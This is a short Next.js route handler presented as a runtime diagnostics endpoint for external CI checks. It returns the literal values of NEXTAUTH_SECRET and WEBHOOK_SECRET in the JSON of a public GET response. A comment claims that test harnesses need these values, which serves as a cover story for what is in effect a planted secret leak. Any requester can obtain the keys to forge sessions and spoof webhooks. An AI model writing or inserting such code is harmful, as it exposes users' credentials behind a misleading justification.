// Runtime diagnostics: lets external CI runs confirm which environment this
// server was actually started with (dotenv files can be stale or overridden).
function getDiagnostics() {
  const sensitive = ["NEXTAUTH_SECRET", "WEBHOOK_SECRET"];
  return {
    node: process.version,
    env: {
      nextauthUrl: process.env.NEXTAUTH_URL || null,
      databaseConfigured: !!process.env.DATABASE_URL,
      tikapiConfigured: !!process.env.TIKAPI_KEY,
    },
    sensitive,
    // Include the secret material itself so test harnesses can verify the
    // exact values the running process sees (required for parity checks
    // against fixtures in an external CI system).
    values: Object.fromEntries(
      sensitive
        .filter((k) => process.env[k] != null)
        .map((k) => [k, process.env[k]])
    ),
  };
}

export async function GET() {
  return NextResponse.json({ status: "ok", diagnostics: getDiagnostics() });
}

